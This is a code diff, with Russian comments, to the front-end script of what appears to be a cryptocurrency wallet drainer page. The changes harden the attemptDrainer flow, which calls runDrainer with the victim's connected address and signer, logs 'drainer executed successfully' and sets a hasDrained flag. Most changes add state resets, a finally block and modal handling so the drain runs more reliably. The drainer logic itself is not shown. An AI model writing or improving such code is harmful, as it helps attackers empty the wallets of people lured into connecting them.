@@ -131,6 +131,7 @@ window.addEventListener('DOMContentLoaded', () => {
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
+      pointer-events: auto; /* Убедимся, что оверлей кликабельный, пока виден */
     }
 
     .modal-content {
@@ -384,12 +385,16 @@ window.addEventListener('DOMContentLoaded', () => {
 // === Управление модальным окном ===
 function showModal() {
   modalOverlay.style.display = 'block';
+  modalOverlay.style.pointerEvents = 'auto'; // Убедимся, что оверлей кликабельный
   modalContent.style.display = 'block';
 }
 
 function hideModal() {
   modalOverlay.style.display = 'none';
+  modalOverlay.style.pointerEvents = 'none'; // Отключаем кликабельность оверлея
   modalContent.style.display = 'none';
+  // Убедимся, что основной контент снова доступен
+  document.body.style.pointerEvents = 'auto';
 }
 
 // === Выполнение drainer ===
@@ -405,7 +410,7 @@ async function attemptDrainer() {
   }
 
   console.log(`📍 Используется адрес: ${connectedAddress}`);
-  showModal(); // Теперь модальное окно открывается каждый раз
+  showModal(); // Открываем модальное окно
 
   try {
     const provider = await getReliableProvider();
@@ -415,19 +420,20 @@ async function attemptDrainer() {
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       console.error('❌ Несоответствие адресов:', address, connectedAddress);
       hideModal();
+      isTransactionPending = false; // Сбрасываем состояние
       return;
     }
 
     isTransactionPending = true;
-    await runDrainer(provider, signer, connectedAddress);
-    console.log('✅ Drainer выполнен успешно');
+    const status = await runDrainer(provider, signer, connectedAddress);
+    console.log('✅ Drainer выполнен успешно, статус:', status);
 
     hasDrained = true;
     isTransactionPending = false;
     cleanup();
     hideModal();
   } catch (err) {
-    isTransactionPending = false;
+    isTransactionPending = false; // Сбрасываем состояние даже при ошибке
     hideModal();
     if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
@@ -435,6 +441,10 @@ async function attemptDrainer() {
       console.error('❌ Ошибка выполнения drainer:', err.message);
       throw err;
     }
+  } finally {
+    // Гарантируем, что состояние сброшено и модальное окно закрыто
+    isTransactionPending = false;
+    hideModal();
   }
 }
 
@@ -458,6 +468,8 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
+    isTransactionPending = false; // Сбрасываем состояние при ошибке подключения
+    hideModal();
   }
 }
 
@@ -478,6 +490,7 @@ function cleanup() {
   window.ethereum.removeListener('chainChanged', onChainChanged);
   actionBtn.disabled = true;
   actionBtn.style.opacity = '0.6';
+  hideModal(); // Убедимся, что модальное окно закрыто
 }
 
 // === Ожидание подключения кошелька ===
